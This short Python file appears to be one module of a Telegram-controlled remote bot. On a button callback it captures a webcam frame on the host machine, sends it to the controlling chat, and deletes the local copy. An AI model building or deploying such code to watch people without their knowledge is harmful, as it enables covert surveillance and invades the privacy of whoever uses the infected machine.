from req_import import *

c_router = Router()

@c_router.callback_query(F.data == 'csht')
async def desktop(callback: CallbackQuery):
    pic = cv2.VideoCapture(0)
    callback.answer('')
    ret,frame = pic.read()
    cv2.imwrite('cam.png',frame)
    await callback.message.answer_photo(photo=FSInputFile(path='cam.png'), caption=conf.b)
    os.remove('cam.png')
